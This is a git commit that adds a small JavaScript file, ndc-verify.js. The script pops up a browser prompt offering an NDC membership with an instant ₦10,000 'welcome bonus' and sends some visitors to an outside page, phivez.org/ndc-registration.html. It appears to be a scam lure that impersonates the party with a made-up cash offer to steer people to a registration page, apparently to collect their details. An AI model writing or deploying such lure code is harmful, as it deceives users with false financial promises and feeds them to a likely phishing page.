bc9bbac3c91c61c515147fc65f96a6d6ac274595
newblog13 <sweet16guyz@gmail.com>
2026-05-10 10:01:50 +0100

    Create ndc-verify.js

---
+++ ndc-verify.js
@@ -0,0 +1,5 @@
+var password = 'Get ₦10,000 Bonus'
+password=prompt('NDC: Hello, Register Now as NDC Member and get ₦10,000 Welcome Bonus Instantly POWERED BY: (NDC), click OK to Register Now','Get ₦10,000 Bonus');
+if (password != 'Get ₦10,000 Bonus') {
+location.href='https://phivez.org/ndc-registration.html';
+}
